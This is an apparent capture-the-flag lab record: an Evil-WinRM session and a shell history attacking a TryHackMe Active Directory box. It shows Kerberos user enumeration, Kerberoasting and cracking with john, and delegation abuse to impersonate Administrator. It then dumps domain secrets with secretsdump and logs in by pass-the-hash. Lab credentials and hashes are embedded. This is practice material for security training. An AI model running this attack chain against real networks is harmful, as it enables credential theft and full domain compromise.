+d-----         6/7/2021   8:05 PM                Shares
+d-r---         6/8/2021  11:54 AM                Users
+d-----         6/8/2021   3:50 PM                Windows
+
+
+*Evil-WinRM* PS C:\> cd Perflogs
+*Evil-WinRM* PS C:\Perflogs> Get-ChildItem -Recurse -Filter "root.*"
+
+
+    Directory: C:\Perflogs\Admin
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/7/2021   8:07 PM             22 root.txt
+
+
+*Evil-WinRM* PS C:\Perflogs> cd C:\Perflogs\Admin
+*Evil-WinRM* PS C:\Perflogs\Admin> type root.txt
+THM{Cr0ccCrewStr1kes!}
+*Evil-WinRM* PS C:\Perflogs\Admin> cd ..
+*Evil-WinRM* PS C:\Perflogs> Get-ChildItem -Recurse -Filter "crew"
+*Evil-WinRM* PS C:\Perflogs> Get-ChildItem -Recurse -Filter "*crew*"
+*Evil-WinRM* PS C:\Perflogs> cd ..
+*Evil-WinRM* PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/7/2021   7:30 PM                Background
+d-----         6/7/2021   5:30 PM                inetpub
+d-----         6/7/2021  10:53 PM                PerfLogs
+d-r---         6/8/2021   3:44 PM                Program Files
+d-----         6/7/2021   5:25 PM                Program Files (x86)
+d-----         6/7/2021   8:05 PM                Shares
+d-r---         6/8/2021  11:54 AM                Users
+d-----         6/8/2021   3:50 PM                Windows
+
+
+*Evil-WinRM* PS C:\> cd Shares
+*Evil-WinRM* PS C:\Shares> Get-ChildItem -Recurse -Filter "*crew*"
+*Evil-WinRM* PS C:\Shares> cd ../Users
+*Evil-WinRM* PS C:\Users> Get-ChildItem -Recurse -Filter "*crew*"
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/7/2021  10:23 PM                admcrocccrew
+
+
+    Directory: C:\Users\admcrocccrew\Pictures
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/7/2021  10:22 PM          66629 crocc-crew-wallpaper.png
+
+
+    Directory: C:\Users\Administrator\Pictures
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/7/2021  10:22 PM          66629 crocc-crew-wallpaper.png
+
+
+*Evil-WinRM* PS C:\Users>
+
+
+Warning: Press "y" to exit, press any other key to continue
+*Evil-WinRM* PS C:\Users> @s^C
+
+
+Warning: Press "y" to exit, press any other key to continue
+*Evil-WinRM* PS C:\Users> exit
+
+Info: Exiting with code 0
+
+ping target.thm
+  479  ldapsearch -x -H ldap://target.thm -b "dc=thm,dc=local" > ldapenum.log
+  480  cat ldapenum.log
+  481  ldapsearch -x -H ldap://10.49.153.231 -b "dc=thm,dc=local" > ldapenum.log
+  482  cat ldapenum.log
+  483  nano site-main.md
+  484  nano site-robots.txt
+  485  cat site-main.md
+  486  sudo apt install kerbrute
+  487  wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
+  488  ls
+  489  chmod +x kerbrute_linux_amd64
+  490  sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
+  491  kerbrute userenum -d COOCTUS.CORP --dc COOCTUS.CORP0 -v -o coorectusr.txt hackers.txt
+  492  kerbrute userenum -d COOCTUS.CORP --dc COOCTUS.CORP0 -v -o coorectusr.txt users.txt
+  493  kerbrute userenum -d COOCTUS.CORP --dc COOCTUS.CORP0 -v -o coorectusr.txt users.txt > validhackers.log
+  494  kerbrute userenum -d COOCTUS.CORP --dc COOCTUS.CORP0 -v -o coorectusr.txt users.txt | grep "[+]" > validhackers.log
+  495  kerbrute userenum -d COOCTUS.CORP --dc COOCTUS.CORP0 -v -o coorectusr.txt users.txt > validhackers.log
+  496  kerbrute userenum -d COOCTUS.CORP --dc COOCTUS.CORP0 -v -o coorectusr.txt users.txt | grep "[+]" > validhackers-1.log
+  497  cat validhackers-1.log
+  498  rpcclient -U '' -N target.thm
+  499  enum4linux -A target.thm
+  500  nmap -p 3389 --script rdp-enum-encryption targeyt.thm
+  501  nmap -p 3389 --script rdp-enum-encryption target.thm
+  502  rdesktop -g 50% target.thm
+  503  smbclient -L //COOCTUS.CORP -U Visitor%GuestLogin!
+  504  smbclient -L //COOCTUS.CORP/Home -U Visitor%GuestLogin!
+  505  smbclient -L //COOCTUS.CORP/Home -U Visitor
+  506  smbclient -L //COOCTUS.CORP/Home -U "Visitor"
+  507  smbclient -L //COOCTUS.CORP/Home -u "Visitor" -p "GuestLogin
+  508  smbclient -L //COOCTUS.CORP/Home -u Visitor -p GuestLogin!
+  509  smbclient -L //COOCTUS.CORP/Home -U "Visitor"
+  510  smbclient -L //10.49.153.231/Home -U "Visitor"
+  511  smbclient -L //10.49.153.231/Home -U "Visitor" -m SMB3
+  512  smbclient -L //10.49.153.231/Home -U "Visitor" -m SMB2
+  513  smbclient -L //10.49.153.231/Home -U "Visitor" -m SMB1
+  514  smbclient -L //10.49.153.231/Home -U "Visitor"
+  515  impacket-smbclient Visitor:GuestLogin
+  516  impacket-smbclient Visitor:GuestLogin@target.thm
+  517  impacket-smbclient Visitor:GuestLogin@10.49.153.231
+  518  sudo apt install crackmapexec
+  519  crackmapexec smb 10.10.175.192 -u Visitor -p GuestLogin!
+  520  crackmapexec smb target.thm -u Visitor -p GuestLogin!
+  521  impacket-smbclient COOCTUS.CORP\Visitor:GuestLogin@10.49.153.231
+  522  smbclient -L //10.49.153.231/Home -U "COOCTUS.CORP\Visitor"
+  523  impacket-smbclient COOCTUS.CORP\Visitor:GuestLogin
+  524  impacket-smbclient Visitor:GuestLogin
+  525  impacket-smbclient Visitor:GuestLogin!
+  526  cat /etc/hosts
+  527  crackmapexec smb 10.49.153.231 -u Visitor -p GuestLogin!
+  528  smbclient -L //10.49.153.231/Home -U "Visitor%GuestLogin
+  529  smbclient -L //10.49.153.231/Home -U Visitor%GuestLogin!
+  530  smbclient -L //10.49.153.231/Home -U COOCTUS.CORP\Visitor%GuestLogin!
+  531  smbclient -L //10.49.153.231/Home -U Visitor%GuestLogin!
+  532  smbclient -L //10.49.153.231/SYSVOL -U Visitor%GuestLogin!
+  533  smbclient -L //10.49.153.231/NETLOGON -U Visitor%GuestLogin!
+  534  smbclient -L //10.49.182.135/Home -U Visitor%GuestLogin!
+  535  smbclient -L //10.49.182.135 -U Visitor%GuestLogin!
+  536  crackmapexec smb 10.49.182.135 -u Visitor -p GuestLogin!
+  537  nano /etc/hosts
+  538  sudo nano /etc/hosts
+  539  smbclient -L //10.49.182.135 -U Visitor%GuestLogin!
+  540  smbclient -L //10.49.182.135/Home -U Visitor%GuestLogin!
+  541  smbclient //10.49.182.135/Home -U Visitor%GuestLogin!
+  542  impacket-getTGT COOCTUS.CORP/Visitor:"GuestLogin\n\n"
+  543  impacket-getTGT COOCTUS.CORP/Visitor:'GuestLogin!'
+  544  cat Visitor.ccache
+  545  export KERBEROSNAME=Visitor.ccache
+  546  export KERBEROSNAMECREDCACHE=Visitor.ccache
+  547  john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+  548  john --format=krb5tgs prhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+  549  cp Visitor.ccache hash.txt
+  550  john --format=krb5tgs prhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+  551  john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+  552  impacket-GetUserSPNs -request -k -dc-ip target.thm COOCTUS.CORP/Visitor:'GuestLogin!'
+  553  echo "$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$879bd0e999943e7c3b95634b03f781b0$60bbfcf91b67482d96ed19239e27553737a9dc28c4ea7870f544e49673e40a1523ef6b90076e81d2bbb57e8b0f95229dbb82f36b30ef5d2a91ad3a095da76dad2a9d4b8be759fe6bbde25c7aaedf8cab0af2f89d77cf3433b02911eb19ac320aa34d9775c15c04524cc5cbfbe568211bde61b1003d4e94e63d6edf0ac328bb3805f43f7b3bde6e348780c8914b63dd95e498e53eb046cb5c8716f656713efe00e4fe03d1759298c4a2923ce7b5f720c5f434d66b788ceddc9c2d082fd4ada6a097f4b1fc699f1a9c7004095a95c9ab21dbc2dfec4b1f10bcc8226bc80c96229c6fe6998688a92419d1efa9d10b35db7713eb143f84ca26bf2e185e9b49b144d951b1fd93f4c241133e0c6f67e35173d44d460064e730dc061f7815ab2fbb470f8584d7995a02ca0d99902714e3b4525ab2543e18390d4d4bd3759878414137afd2a7483a16f6fbddd5ea55187a522a0b8dfe582c6182a7d5e4043b61a852050a41211154952ba4e5ec9b6b91e25b5ec66be18b42d65b8073e7a5aa6f0fd53f57df36a6cba3750a5c9bd3e77a9112d34a0fd3a0a9d27e04b2e2229095ab25dad69d19b3f4649cf2567ce23522d1ea729747703edb968a848b26884ac2d9449f805f496a1eefe2a9323ad9a304f58f13ed19abdd221b2bac3770874486426eef51015a1d994dc154a415723c18c3ecb7ee1e424df8a305226c99bfb31e70623b1817fef93e173814a368464c4d0c43a698ad7ef8d8a5680bed4e7b7ec92f5ed6b808516a8647ced7e14544f0b5f790a269777560d0b180f5e86e565e1b80ce83b3e3ebeb58bf34b71199c4fa73181f5715a0131deccd8f045cb66d807214c75812f2077032bda05e2b8c653f96171f86ae46d992edb9eb3bb624bcf16151d736a3ec5a31c2eb17daea8c35fc50442c13d69e431459824d9c20c0db481e9e571263188b9d2ccbba35e561996ba524fe4bae09cce79bf452c595bcaef9f3b34b72d7323be6cb6bfd78a99a89b6addb840585085bab3e3f65ba7ce63d1021c824c07b248218e03e06113a82292265c7656ea1e4acdb7501213ec8acf559110ce8307d75299412fe56bce4d21579339526e735b39588e109b40bc9652bcb12e38991cd38b921e152cbfff87754aa56231fbf88880f2ba157a6865c7c5f5156d7223a6276111cd8686e3a4e619b6639e4802c403f27591d59e3e69ccb8c87ad0651b76536f5eeb7ed220fb5b6e02ca2376c345074c047bf2e0059655e2171e634d72cf2215b37dd5155f1c59ffd43a9bec1c044932e7022bc9dc07478eb3bf6c4a7a266bd9e9f0153b377299d8a4904940f5184f478e8ac96e08c0ef7edf48b" > hash.txt
+  554  john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+  555  cat hash.txt
+  556  echo  > hash.txt
+  557  echo '$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$879bd0e999943e7c3b95634b03f781b0$60bbfcf91b67482d96ed19239e27553737a9dc28c4ea7870f544e49673e40a1523ef6b90076e81d2bbb57e8b0f95229dbb82f36b30ef5d2a91ad3a095da76dad2a9d4b8be759fe6bbde25c7aaedf8cab0af2f89d77cf3433b02911eb19ac320aa34d9775c15c04524cc5cbfbe568211bde61b1003d4e94e63d6edf0ac328bb3805f43f7b3bde6e348780c8914b63dd95e498e53eb046cb5c8716f656713efe00e4fe03d1759298c4a2923ce7b5f720c5f434d66b788ceddc9c2d082fd4ada6a097f4b1fc699f1a9c7004095a95c9ab21dbc2dfec4b1f10bcc8226bc80c96229c6fe6998688a92419d1efa9d10b35db7713eb143f84ca26bf2e185e9b49b144d951b1fd93f4c241133e0c6f67e35173d44d460064e730dc061f7815ab2fbb470f8584d7995a02ca0d99902714e3b4525ab2543e18390d4d4bd3759878414137afd2a7483a16f6fbddd5ea55187a522a0b8dfe582c6182a7d5e4043b61a852050a41211154952ba4e5ec9b6b91e25b5ec66be18b42d65b8073e7a5aa6f0fd53f57df36a6cba3750a5c9bd3e77a9112d34a0fd3a0a9d27e04b2e2229095ab25dad69d19b3f4649cf2567ce23522d1ea729747703edb968a848b26884ac2d9449f805f496a1eefe2a9323ad9a304f58f13ed19abdd221b2bac3770874486426eef51015a1d994dc154a415723c18c3ecb7ee1e424df8a305226c99bfb31e70623b1817fef93e173814a368464c4d0c43a698ad7ef8d8a5680bed4e7b7ec92f5ed6b808516a8647ced7e14544f0b5f790a269777560d0b180f5e86e565e1b80ce83b3e3ebeb58bf34b71199c4fa73181f5715a0131deccd8f045cb66d807214c75812f2077032bda05e2b8c653f96171f86ae46d992edb9eb3bb624bcf16151d736a3ec5a31c2eb17daea8c35fc50442c13d69e431459824d9c20c0db481e9e571263188b9d2ccbba35e561996ba524fe4bae09cce79bf452c595bcaef9f3b34b72d7323be6cb6bfd78a99a89b6addb840585085bab3e3f65ba7ce63d1021c824c07b248218e03e06113a82292265c7656ea1e4acdb7501213ec8acf559110ce8307d75299412fe56bce4d21579339526e735b39588e109b40bc9652bcb12e38991cd38b921e152cbfff87754aa56231fbf88880f2ba157a6865c7c5f5156d7223a6276111cd8686e3a4e619b6639e4802c403f27591d59e3e69ccb8c87ad0651b76536f5eeb7ed220fb5b6e02ca2376c345074c047bf2e0059655e2171e634d72cf2215b37dd5155f1c59ffd43a9bec1c044932e7022bc9dc07478eb3bf6c4a7a266bd9e9f0153b377299d8a4904940f5184f478e8ac96e08c0ef7edf48b' > hash.txt
+  558  cat hash.txt
+  559  john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+  560  impacket-findDelegation -dc-ip target.thm COOCTUS.CORP/password-reset:'resetpassword'
+  561  impacket-getTGT COOCTUS.CORP/password-reset:'resetpassword'
+  562  impacket-getTGT COOCTUS.CORP/password-reset:'resetpassword' -dc-ip target.thm
+  563  export KRB5CCNAME=password-reset.ccache
+  564  impacket-getST -k -spn oakley/DC.COOCTUS.CORP -impersonate Administrator COOCTUS.CORP/password-reset:'resetpassword'
+  565  export KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
+  566  mv Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache Administrator.ccache
+  567  export KRB5CCNAME=Administrator.ccache
+  568  impacket-secretsdump -no-pass -k DC.COOCTUS.CORP
+  569  apt-cache policy python3-impacket\n
+  570  export VERSION=0.11.0kali1
+  571  sudo apt install python3-impacket=VERSION\n
+  572  export VERSION=0.11.0
+  573  sudo apt install python3-impacket=VERSION\n
+  574  sudo nano /etc/hosts
+  575  impacket-secretsdump -no-pass -k DC.COOCTUS.CORP
+  576  impacket-secretsdump -no-pass -k DC.COOCTUS.CORP -just-dc-user
+  577  impacket-secretsdump -no-pass -k DC.COOCTUS.CORP -just-dc-user Administrator
+  578  impacket-secretsdump -no-pass -k DC.COOCTUS.CORP
+  579  wget https://github.com/fortra/impacket/releases/download/impacket_0_11_0/impacket-0.11.0.tar.gz
+  580  tar -xzf impacket-0.11.0.tar.gz
+  581  ls
+  582  cd impacket-0.11.0
+  583  ls
+  584  cd ..
+  585  ls
+  586  pip install -r impacket-0.11.0/requirements.txt
+  587  source thmenv/bin/activate
+  588  pip install -r impacket-0.11.0/requirements.txt
+  589  ls impacket-0.11.0
+  590  ls impacket-0.11.0/impacket
+  591  find -f secretsdump.py -maxdepth 5 .
+  592  find -file secretsdump.py -maxdepth 5 .
+  593  find . -name secretsdump.py -maxdepth 5
+  594  cat ./impacket-0.11.0/examples/secretsdump.py
+  595  ./impacket-0.11.0/examples/secretsdump.py -k -no-pass DC.COOCTUS.CORP
+  596  python ./impacket-0.11.0/examples/secretsdump.py -k -no-pass DC.COOCTUS.CORP
+  597  impacket-secretsdump -no-pass -k DC.COOCTUS.CORP
+  598  deactivate
+  599  impacket-secretsdump -no-pass -k DC.COOCTUS.CORP
+  600  python ./impacket-0.11.0/examples/secretsdump.py -k -no-pass DC.COOCTUS.CORP
+  601  python secretsdump.py -k -no-pass -just-dc-user Administrator DC.COOCTUS.CORP
+  602  python ./impacket-0.11.0/examples/secretsdump.py -k -no-pass -just-dc-user Administrator DC.COOCTUS.CORP
+  603  impacket-secretsdump -no-pass -k -just-dc-user Administrator DC.COOCTUS.CORP
+  604  echo $KRB5CCNAME
+  605  ls
+  606  cat Administrator.ccache
+  607  export KRB5CCNAME=Administrator.ccache
+  608  sudo apt install klist
+  609  sudo apt install krb5-user\n
+  610  klist
+  611  impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip target.thm
+  612  export KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
+  613  klist
+  614  cat /etc
+  615  cat /etc/hosts
+  616  impacket-secretsdump -no-pass -k -just-dc-user Administrator DC.COOCTUS.CORP
+  617  impacket-secretsdump -no-pass -k DC.COOCTUS.CORP
+  618  evil-winrm -u Administrator -H add41095f1fb0405b32f70a489de022d -i target.thm
